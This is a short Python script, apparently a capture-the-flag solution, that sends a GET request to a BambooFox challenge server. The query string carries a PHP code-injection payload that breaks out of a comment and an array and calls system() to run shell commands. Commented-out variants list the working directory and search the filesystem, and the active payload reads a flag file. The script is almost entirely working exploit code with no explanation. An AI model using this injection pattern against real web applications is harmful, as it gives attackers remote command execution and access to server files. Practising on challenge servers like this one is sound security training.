import requests as rq

payload1 = """/*"""
#payload2 = """"*/]);/*"""
#payload2 = """"*/]);system('pwd');/*"""
#payload2 = """"*/]);system('find / | grep flag');/*"""
payload2 = """*/]);system('cat /flag_de42537a7dd854f4ce27234a103d4362');/*"""




url = f"http://chall.ctf.bamboofox.tw:9487/?%E3%83%BD(%23%60%D0%94%C2%B4)%EF%BE%89[{payload1}]={payload2}"
res = rq.get(url)

print(res.text)